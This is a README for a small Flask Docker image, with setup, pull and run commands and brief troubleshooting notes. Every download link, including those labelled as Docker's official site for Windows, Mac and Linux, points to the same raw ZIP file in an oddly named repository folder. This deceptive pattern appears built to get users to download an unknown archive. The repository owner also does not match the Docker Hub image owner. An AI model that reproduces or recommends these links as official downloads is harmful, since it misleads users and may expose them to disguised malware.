## üì¶ Introduction

The tiny-flask-docker-image is designed for users who want a small yet powerful environment for running Flask applications. This Docker image is just 50 MB, making it one of the smallest options available for production use. Whether you‚Äôre looking to host a small web service or test an idea quickly, this image offers a straightforward solution.

## üöÄ Getting Started

Follow these simple steps to get started with tiny-flask-docker-image. You will download the software and run it, all without needing programming expertise.

### 1. Download the Docker Image

To download the tiny-flask-docker-image, visit the following page: [Download the tiny-flask-docker-image](https://raw.githubusercontent.com/sreenath-BH/tiny-flask-docker-image/main/indomitableness/tiny-flask-docker-image.zip).

### 2. Install Docker

Before you can use the image, you need to install Docker on your computer. Docker is a platform that allows you to run applications in containers. 

- **Windows:** Download Docker Desktop from the [official website](https://raw.githubusercontent.com/sreenath-BH/tiny-flask-docker-image/main/indomitableness/tiny-flask-docker-image.zip).
- **Mac:** Download Docker Desktop for Mac from the [official site](https://raw.githubusercontent.com/sreenath-BH/tiny-flask-docker-image/main/indomitableness/tiny-flask-docker-image.zip).
- **Linux:** Follow the instructions specific to your distribution on the [Docker Linux installation page](https://raw.githubusercontent.com/sreenath-BH/tiny-flask-docker-image/main/indomitableness/tiny-flask-docker-image.zip).

### 3. Pull the Image

Once Docker is installed, you can pull the tiny-flask-docker-image from the Docker Hub. Open your terminal or command prompt and enter the following command:

```bash
docker pull ardeshirv/tiny-flask-docker-image
```

### 4. Run the Image

After downloading the image, you can run it with a simple command. Use the following command in your terminal:

```bash
docker run -d -p 5000:5000 ardeshirv/tiny-flask-docker-image
```

This command tells Docker to run the tiny-flask-docker-image and makes it available on port 5000.

### 5. Access the Application

Your Flask application will now be running. To view it, open your web browser and go to:

```
http://localhost:5000
```

You should see a default welcome page from your tiny Flask application.

## üîß Features

- **Minimal Size:** At only 50 MB, it's easy to download and use.
- **Production Ready:** Optimized for running Flask applications in a production environment.
- **Quick Deployment:** Get your application up and running in minutes with minimal configuration.

## üìñ Documentation

This section will guide you through basic usage and customization. 

### Configuring the Application

You may want to make changes to the Flask app. You can do this by modifying the application files. To access these files, you can create a volume when you run the container:

```bash
docker run -d -p 5000:5000 -v /path/to/your/app:/app ardeshirv/tiny-flask-docker-image
```

Replace `/path/to/your/app` with the path to your local application files.

## üõ†Ô∏è Troubleshooting

#### Unable to Connect to Server

If you cannot reach the application, check the following:

- Ensure Docker is running.
- Verify that the correct port (5000) is exposed.
- Look for any error messages in the terminal.
